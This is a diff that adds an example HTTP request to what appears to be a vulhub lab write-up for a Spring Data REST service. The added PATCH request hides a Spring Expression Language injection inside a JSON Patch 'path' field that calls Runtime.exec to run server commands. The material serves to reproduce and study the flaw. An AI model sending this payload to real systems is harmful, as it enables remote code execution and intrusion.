@@ -51,3 +51,17 @@ Content-Length: 440
     }
 ]
 ```
+
+```
+PATCH /customers/1 HTTP/1.1
+Host: 192.168.101.133:8080
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+Content-Type: application/json-patch+json
+Content-Length: 202
+
+[{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{9}))/lastname", "value": "vulhub" }]
+```
